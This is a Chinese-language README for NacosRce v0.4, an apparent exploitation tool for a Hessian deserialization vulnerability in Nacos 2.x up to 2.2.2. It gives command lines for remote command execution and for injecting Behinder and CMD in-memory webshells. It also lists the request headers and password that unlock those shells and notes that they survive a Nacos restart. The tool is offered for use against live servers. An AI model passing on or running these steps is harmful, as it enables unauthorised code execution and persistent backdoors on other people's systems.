<a name="QnUES"></a>
## Nacos Hessian 反序列化漏洞利用工具 v0.4

```latex

  _   _                     ____          
 | \ | | __ _  ___ ___  ___|  _ \ ___ ___ 
 |  \| |/ _` |/ __/ _ \/ __| |_) / __/ _ \
 | |\  | (_| | (_| (_) \__ \  _ < (_|  __/
 |_| \_|\__,_|\___\___/|___/_| \_\___\___|
```
<br />Author: 刨洞安全 && 凉风<br />**食用方式 **

1. 执行无回显命令	<br />java -jar NacosRce.jar ip:port "command"
2. 同时注入冰蝎&&CMD内存马(推荐)<br />java -jar NacosRce.jar ip:port memshell
3. 如果nacos是win的: java -jar NacosRce.jar ip:port memshell windows

1. 冰蝎内存马使用方法：<br />1、需要设置请求头x-client-data:rebeyond<br />2、设置Referer:https://www.google.com/<br />3、路径随意<br />4、密码rebeyond
2. CMD内存马使用方法：<br />1、需要设置请求头x-client-data:cmd<br />2、设置Referer:https://www.google.com/<br />3、请求头cmd:要执行的命令

v0.4版本实现了：<br />1、不出网漏洞利用<br />2、可多次发起漏洞利用<br />3、注入冰蝎/CMD内存马<br />4、内存马对多版本进行了兼容<br />tips:<br />1、请用jdk1.8<br />2、适用于 Nacos 2.x <= 2.2.2<br />3、非集群的也能打哦<br />4、此内存马重启nacos依然存活

参考文章<br />[https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/](https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/)<br />[https://exp.ci/2023/06/14/Nacos-JRaft-Hessian-反序列化分析/](https://exp.ci/2023/06/14/Nacos-JRaft-Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/)<br />[https://github.com/Y4er/ysoserial](https://github.com/Y4er/ysoserial)
